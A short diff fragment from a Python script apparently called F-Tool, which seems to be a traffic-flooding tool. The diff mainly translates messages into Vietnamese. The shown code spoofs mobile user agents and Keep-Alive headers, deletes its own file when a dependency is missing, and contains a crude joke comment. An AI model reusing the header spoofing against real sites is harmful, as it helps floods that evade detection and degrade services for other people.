+	'Mozilla/5.0 (Linux; Android 12; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.26 Mobile Safari/537.36']
 
 	return {
 	'Connection': 'Keep-Alive',
@@ -674,7 +686,7 @@ def spoof_useragents():
 	}
 
 def main():
-	#  checking if you're gay 😏
+	#  kiểm tra xem bạn có phải là gay không 😏
 	F_Tool.styleText("[+] Kiểm tra phụ thuộc...\n\n")
 	pkgs = ['screen', 'node']
 	install = True
@@ -693,7 +705,7 @@ def main():
 		with open('utils') as important:pass
 	except IsADirectoryError:pass
 	except FileNotFoundError:
-		print(f"{Color.LR}[CRITICAL ERROR]:{Color.RESET} File: 'utils' Không tìm thấy")
+		print(f"{Color.LR}[CRITICAL LỖI]:{Color.RESET} File: 'utils' Không tìm thấy")
 		print("\n[+] Vui lòng tải xuống trên GitHub, hoặc git clone https://github.com/DauDau432/F-Tool\n")
 		os.remove(f'{__file__}')
 		script = False
